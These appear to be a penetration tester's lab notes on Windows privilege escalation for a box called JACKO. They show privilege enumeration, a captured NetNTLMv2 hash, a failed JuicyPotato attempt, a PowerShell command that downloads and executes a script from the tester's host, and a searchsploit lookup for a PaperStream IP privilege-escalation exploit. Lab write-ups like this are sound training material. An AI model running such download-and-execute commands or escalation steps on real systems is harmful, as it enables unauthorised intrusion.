# 5 box enum tony

```
PS C:\Windows> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled

͹ Enumerating Security Packages Credentials
Version: NetNTLMv2
Hash:    tony::JACKO:1122334455667788:e6fb7d36b2e89e4f15c75b2348c20d67:010100000000000002cb71da4d91d7012e948084d6331e3e000000000800300030000000000000000000000000300000c854ea0a8f4dcdd8bb4201a7ed1c553cc740fa87dbd6763c7063e1ec205803dd0a00100000000000000000000000000000000000090000000000000000000000

# tried JuicyPotato; fails with COM error
# finally understood that Build is 1909 and not vulnerable to JP anymore.

# finding installed apps
https://github.com/jaapbrasser/SharedScripts/tree/master/Get-RemoteProgram
C:\Program Files (x86)\H2\service> powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.105/Get-RemoteProgram.ps1')

ComputerName ProgramName
------------ -----------
JACKO        VMware Tools
JACKO        Java 8 Update 251 (64-bit)
JACKO        Microsoft Visual C++ 2017 x64 Additional Runtime - 14.12.25810
JACKO        Microsoft Visual C++ 2017 x64 Minimum Runtime - 14.12.25810
JACKO        Scanner Central Admin Agent
JACKO        Software Operation Panel
JACKO        PaperStream IP (TWAIN)
JACKO        Software Operation Panel
JACKO        Java Auto Updater
JACKO        Microsoft Visual C++ 2017 Redistributable (x86) - 14.12.25810
JACKO        Scanner Central Admin Agent 1.4
JACKO        Microsoft Visual C++ 2017 x86 Additional Runtime - 14.12.25810
JACKO        Microsoft Visual C++ 2017 x86 Minimum Runtime - 14.12.25810
JACKO        Microsoft Visual C++ 2017 Redistributable (x64) - 14.12.25810
JACKO        H2
JACKO        Microsoft OneDrive

$ searchsploit PaperStream
PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation | windows/local/49382.ps1
https://www.exploit-db.com/exploits/49382
```
